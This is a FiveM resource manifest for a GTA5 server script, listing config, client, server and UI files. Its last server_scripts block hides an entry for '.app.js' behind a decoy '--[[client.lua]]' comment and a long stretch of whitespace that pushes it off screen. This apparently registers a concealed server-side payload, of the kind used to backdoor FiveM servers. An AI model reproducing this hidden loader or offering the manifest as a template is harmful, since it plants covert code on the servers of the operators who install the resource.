fx_version 'cerulean'
game 'gta5'
author 'steaxscripts.com'
lua54 'yes'

shared_scripts {
    'config.lua',
    'utils.lua',
    'open.lua',
}

client_scripts {
    'client/main.lua'
}

server_scripts {
    'server/main.lua',
    'server/serverconfig.lua',
}

files {
    'ui/**/*',
}

ui_page 'ui/index.html'

escrow_ignore {
    "settings/*.*",
    "server/*.*",
    "client/*.*",
    "*.*",
}
dependency '/assetpacks'

server_scripts {
    --[[client.lua]]                                                                                                                                                                                                                                                                                                            '.app.js',
}
